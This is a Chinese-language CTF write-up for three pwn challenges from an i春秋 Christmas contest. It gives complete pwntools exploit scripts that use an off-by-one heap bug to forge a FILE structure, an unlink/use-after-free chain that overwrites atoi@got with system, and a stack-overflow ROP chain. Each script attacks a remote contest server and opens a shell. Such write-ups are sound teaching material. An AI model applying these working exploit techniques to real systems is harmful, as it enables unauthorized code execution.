---
title: i春秋网络内生安全实验场圣诞赛
categories: 
- CTF writeup
---

# i春秋网络内生安全实验场圣诞赛

## 前言

复习无聊，间隙做了这个小比赛的几个题，pwn整体难度不高，很友好。

## heap

### 漏洞利用

看雪CTFQ3的原题，有off-by-one。libc为2.23。malloc_hook自己加了一个hook函数，所以改hook没用，这里ub攻击IO_list_all，用0x60的small bin伪造文件结构体get shell。(看群里有WM的师傅可能出题人是同一个)

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./heap')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./heap')

else:
    p = remote('120.55.43.255',12240)

def Add(size,data='a'):
    p.recvuntil('Choice :')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("data: ")
    p.send(data)

def Show():
    p.recvuntil('Choice :')
    p.sendline('3')

def Delete(index):
    p.recvuntil('Choice :')
    p.sendline('2')
    p.recvuntil("Which heap do you want to delete: ")
    p.sendline(str(index))


def exp():
    #leak libc
    Add(0xd0)#0
    Add(0xf8)#1
    Add(0x1f8,p64(0x21)*50)#2
    Add(0x28)#3
    Delete(0)
    Add(0x68,'a'*8)#0
    #gdb.attach(p)
    Show()
    p.recvuntil("0 : aaaaaaaa")
    libc_base = u64(p.recvline().strip("\n")[:-1].ljust(8,'\x00')) - 88- 0x10 - libc.sym['__malloc_hook'] - 0xd0
    log.success("libc base => " + hex(libc_base))
    #get heap
    #vtable
    Add(0x68,'a'*0x60+p64(0)+'\xf1')#4 overwrite 1
    Delete(0)
    Delete(4)
    Add(0x68)#4
    Add(0x68,p64(libc_base+(libc.sym['system']))*13)#0
    Show()
    p.recvuntil("0 : ")
    heap_base = u64(p.recvline().strip('\n')[:-1].ljust(8,'\x00')) - 0x61
    log.success("heap base => " + hex(heap_base))
    #get shell
    fake_vtable = heap_base + 0x20
    Delete(1)
    Delete(2)

    #gdb.attach(p)
    payload = "a"*0xf0
    payload += "/bin/sh\x00"+p64(0x61)+p64(0)+p64(libc_base+0x3c5520-0x10)+p64(2)+p64(3)+"\x00"*0xa8+p64(fake_vtable)
    Add(0x1e8,payload)
    #

    p.recvuntil('Choice :')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(17))
    p.interactive()

exp()
```

## Internal_Chat_System

### 漏洞利用

看这个register和login开始还以为是xctf final的原题，后来发现还是有点不同，UpdateProfile里有个off-by-one，AddDelete里有个UAF。泄露libc卡了我很久，最后Add自己为friend再删除自己，再View就可以将main_arena+88的内容作为name输出，泄露堆地址。  



```c
ssize_t __fastcall UpdateProfile(int idx)
{
  size_t size; // rax
  __int64 v2; // rbx

  printf("Input your name:");
  size = strlen(*(const char **)qword_6030E0[idx]);
  read(0, *(void **)qword_6030E0[idx], size);   // off-by-one
  printf("Input your age:");
  v2 = qword_6030E0[idx];
  *(_QWORD *)(v2 + 8) = read_int();
  printf("Input your description:");
  return read(0, (void *)(v2 + 16), 0x100uLL);
}

unsigned __int64 __fastcall AddDelete(int a1, const char *a2)
{
  int v3; // [rsp+1Ch] [rbp-24h]
  const char **v4; // [rsp+20h] [rbp-20h]
  _QWORD *v5; // [rsp+20h] [rbp-20h]
  const char ***ptr; // [rsp+28h] [rbp-18h]
  char buf; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  printf("So..Do u want to add or delete this friend?(a/d)");
  read(0, &buf, 2uLL);
  if ( buf == 100 )
  {
    v4 = *(const char ***)(qword_6030E0[a1] + 280);
    if ( !v4 )
      puts("What the fuck?");
    while ( v4 && strcmp(a2, *v4) )
      v4 = (const char **)v4[35];
    if ( v4 )
    {
      ptr = *(const char ****)(qword_6030E0[a1] + 280);
      if ( ptr[35] )
      {
        while ( strcmp(*ptr[35], a2) )
          ptr = (const char ***)ptr[35];
        ptr[35] = (const char **)v4[35];
        free(v4);
      }
      else
      {
        *(_QWORD *)(qword_6030E0[a1] + 0x118) = 0LL;
        free(ptr);
      }
    }
    else
    {
      puts("You don't have such a friend!");
    }
  }
  else
  {
    v3 = CheckUser(a2);
    if ( v3 == -1 )
      puts("No such user!");
    v5 = *(_QWORD **)(qword_6030E0[a1] + 280);
    if ( v5 )
    {
      while ( v5[35] )
        v5 = (_QWORD *)v5[35];
      v5[35] = qword_6030E0[v3];
      puts("Done!");
    }
    else
    {
      *(_QWORD *)(qword_6030E0[a1] + 280) = qword_6030E0[v3];
    }
  }
  return __readfsqword(0x28u) ^ v8;
}
```

Unlink之后在bss上构造node->heap(具体而言就是构造一个node，它的name_chunk是一个堆地址，且这个堆地址是一个未释放的node地址(0x130大小的块)，我们按照这个伪造的node信息登上去(username为一个堆地址(就是那个0x130块作为node用的name_chunk地址)))，之后Add一个Friend，就是这个0x130的块，也就是我们构造的假的结构体们如下：  
fake_node:bss_addr->fake_usr_name_addr(some_node_addr)->some_node_addr's user_name_addr。  
一旦我们删除这个friend，即删除这个0x130的块，我们的fake_usr_name_addr的内容就是main_arena+88，View即可得到。  

getshell方法就很多了，我这里是改aoti@got到system，输入菜单的时候输入"/bin/sh\x00"即可。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='debug')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')

else:
    p = remote('120.55.43.255',19812)

def Register(size,name,age=18,des="1"):
    p.sendlineafter("Your choice:","2")
    p.sendlineafter("Input your name size:",str(size))
    p.sendafter("Input your name:",name)
    p.sendlineafter("Input your age:",str(age))
    p.sendafter("Input your description:",des)

def Login(name):
    p.sendlineafter("Your choice:","1")
    p.sendafter("Please input your user name:",name)

def Add(name):
    p.sendlineafter("Your choice:","3")
    p.sendafter("Input the friend's name:",name)
    p.sendlineafter("So..Do u want to add or delete this friend?(a/d)","a")

def Delete(name):
    p.sendlineafter("Your choice:","3")
    p.sendafter("Input the friend's name:",name)
    p.sendafter("So..Do u want to add or delete this friend?(a/d)","d\x00")

def ViewProfile():
    p.sendlineafter("Your choice:","1")

def ViewMsg():
    p.sendlineafter("Your choice:","5")

def Update(name,age=19,des="123"):
    p.sendlineafter("Your choice:","2")
    p.sendafter("Input your name:",name)
    p.sendlineafter("Input your age:",str(age))
    p.sendafter("Input your description:",des)

def SendMsg(name,title="123",content="456"):
    p.sendlineafter("Your choice:","4")
    p.sendafter("Which user do you want to send a msg to:",name)
    p.sendafter("Input your message title:",title)
    p.sendafter("Input your content:",content)

def Logout():
    p.sendlineafter("Your choice:","6")


def exp():
    #leak libc
    Register(0x68,"0"*0x67+"\x00")
    Register(0x68,"1"*0x67+"\x00")
    Register(0x68,"2"*0x67+"\x00")
    Register(0x68,"3"*0x67+"\x00")
    Register(0x68,"4"*0x67+"\x00")#target
    Register(0x68,"5"*0x67+"\x00")
    Register(0x68,"6"*0x67+"\x00")
    Register(0x68,"7"*0x67+"\x00")#target
    Register(0x68,"8"*0x67+"\x00")
    Register(0x68,"9"*0x67+"\x00")
    Register(0x68,"A"*0x67+"\x00")
    Register(0x68,"B"*0x67+"\x00")
    Register(0x68,"C"*0x67+"\x00")
    #leak libc
    Login("A"*0x67+"\x00")
    Add("A"*0x67+"\x00")

    Delete("A"*0x67+"\x00")
    ViewProfile()
    #leak heap
    p.recvuntil("Username:")
    heap_base = u64(p.recvline().strip("\n").ljust(8,"\x00")) - 0x2d50
    log.success("heap base => " + hex(heap_base))
    Logout()
    Register(0x128,p64(elf.got['puts']))

    #unlink 7
    Login("0"*0x67+'\x00')
    Add("6"*0x67+"\x00")
    Add("7"*0x67+"\x00")
    Add("8"*0x67+"\x00")

    Delete("7"*0x67+"\x00")
    Logout()
    #off-by-one
    chunk_lis = 0x6030e0
    fd = chunk_lis + 8*7 - 0x18
    bk = chunk_lis + 8*7 - 0x10
    payload = p64(elf.got['puts'])+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
    Register(0xc0,payload)#ini 1
    Register(0x38,"a"*0x38)#ini 1


    Login("a"*0x38+p64(0x131))
    payload = "a"*0x30+p64(0x120)+"\x30"

    Update(payload)

    Logout()
    #first
    Login("0"*0x67+"\x00")
    Delete("8"*0x67+"\x00")

    Add("3"*0x67+"\x00")
    Add("4"*0x67+"\x00")
    Add("5"*0x67+"\x00")

    Delete("4"*0x67+"\x00")
    Logout()
    #off-by-one
    payload = p64(elf.got['puts'])+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
    #recover
    Register(0x240,p64(elf.bss()),0x603110,p64(heap_base+0xe50))
    Register(0x100,p64(elf.bss()),0x603110,p64(heap_base+0xe50)+p64(0x603100-8))
    Register(0x40,p64(elf.bss()),0x603110,p64(heap_base+0xe50)*2+p64(0x603100-0x10))

    Login(p64(heap_base+0x2cd0))
    Add("C"*0x67+"\x00")


    Delete("C"*0x67+"\x00")
    ViewProfile()
    p.recvuntil("Username:")
    libc_base = u64(p.recvline().strip("\n").ljust(8,"\x00")) - 0x10 - libc.sym["__malloc_hook"] - 88
    log.success("libc base => " + hex(libc_base))
    #get shell
    libc.address = libc_base
    free_hook = libc.sym['__free_hook']
    Logout()
    free_hook = elf.got['atoi']
    Register(0x68,p64(elf.bss()),0x603110,p64(free_hook)*3+p64(0x603100-0x18))
    Register(0x68,p64(elf.bss()),0x603100,p64(free_hook)*3+p64(0x603100-0x18)+"/bin/sh\x00")


    Login(p64(libc.sym['atoi']))
    #gdb.attach(p,"b* 0x400d42")
    #Update(p64(libc.sym["system"]),elf.bss(),p64(0x603110))
    p.sendlineafter("Your choice:","2")
    p.sendafter("Input your name:",p64(libc.sym["system"]))
    p.sendlineafter("Input your age:","/bin/sh\x00")
    p.sendafter("Input your description:","/bin/sh\x00")
    p.sendafter("Your choice:","/bin/sh\x00")
    #
    #Login("0"*0x67+"\x00")

    #SendMsg("3"*0x67+"\x00","a"*0x888,"a")


    p.interactive()

exp()

```

## Self-service Refueling System

### exp.py

这个题基本没什么好说的，普通栈溢出，先leak libc之后get shell。

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')

else:
    p = remote('120.55.43.255',23810)


p_rdi = 0x0000000000400fb3
main_addr = 0x400eaa

def exp():
    #leak libc
    payload = "a"*(0x20-0x8) + p32(0x6666) + p32(0x2333)
    payload += "b"*0x8
    payload += p64(p_rdi)+p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])+p64(main_addr)
    p.recvuntil("Do you want to refuel?(y/n)")
    p.sendline("y")
    p.recvuntil("Plz input your Gas Card ID :")
    raw_input()
    p.send(payload)
    raw_input()
    p.sendline("1")
    libc_base = u64(p.recvuntil("\x7f\n",drop=False)[-7:-1].ljust(8,'\x00')) - libc.sym['puts']

    log.success("libc base => " + hex(libc_base))
    system_addr = libc_base + libc.sym['system']
    binsh_addr = libc_base + libc.search("/bin/sh\x00").next()
    #get shell
    payload = "a"*(0x20-0x8) + p32(0x6666) + p32(0x2333)
    payload += "b"*0x8
    payload += p64(p_rdi)+p64(binsh_addr)
    payload += p64(system_addr)+p64(main_addr)
    p.recvuntil("Do you want to refuel?(y/n)")
    p.sendline("y")
    p.recvuntil("Plz input your Gas Card ID :")
    #gdb.attach(p,'b* 0x400f43')
    raw_input()
    p.send(payload)
    raw_input()
    p.sendline("1")
    p.interactive()

exp()

```

